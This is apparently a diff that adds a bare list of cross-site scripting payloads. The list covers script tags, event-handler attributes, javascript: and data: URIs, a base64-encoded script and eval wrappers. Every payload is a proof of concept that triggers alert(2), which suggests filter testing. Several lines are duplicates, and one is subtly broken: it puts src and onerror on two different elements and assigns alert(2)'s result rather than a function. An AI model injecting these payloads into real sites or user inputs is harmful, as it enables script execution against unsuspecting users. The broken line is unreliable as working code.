@@ -1,0 +1,38 @@
+<script>alert(2)</script>
+<img src='x' onerror='alert(2)'>
+'"><script>alert(2)</script>
+<svg/onload=alert('2')>
+<body onload=alert('2')>
+<iframe src='javascript:alert("2")'>
+<object data='javascript:alert("2")'>
+<embed src="data:text/html,<script>alert(2)</script>">
+<details open ontoggle=alert(2)>
+<a href="javascript:alert(2)">Click me</a>
+<form action="javascript:alert(2)">
+    <input type="submit" value="Submit">
+</form>
+<video src="javascript:alert(2)"></video>
+<svg/onload=eval("alert(2)")>
+<iframe src="data:text/html,<script>alert(2)</script>">
+<iframe src="javascript:eval('alert(2)')">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgyKTs8L3NjcmlwdD4=">
+<svg onload=eval('alert(2)')>
+<div onmouseover="alert(2)">Hover over me</div>
+<iframe src="data:text/html,<script>alert(2)</script>">
+<script src="data:text/javascript,alert(2)"></script>
+<script>fetch('data:text/html,<script>alert(2)</script>').then(response => response.text()).then(eval)</script>
+<script>document.write('<img src=x onerror=alert(2)>')</script>
+<script>document.createElement('img').src='x';document.createElement('img').onerror=alert(2)</script>
+<img src="x" onerror="alert(2)">
+<a href="javascript:alert(2)">Click</a>
+<svg/onload=alert(2)>
+<form><input type="text" onfocus="alert(2)"></form>
+<iframe src="data:text/html,<script>alert(2)</script>"></iframe>
+<object data="data:text/html,<script>alert(2)</script>"></object>
+<embed src="data:text/html,<script>alert(2)</script>"></embed>
+<img src="x" onerror="eval('alert(2)')">
+<a href="javascript:alert(2)">Click here</a>
+<svg/onload="eval('alert(2)')">
+<script>alert(2)</script>
+<video src="javascript:alert(2)"></video>
+<form><input type="text" onfocus="alert(2)"></form>
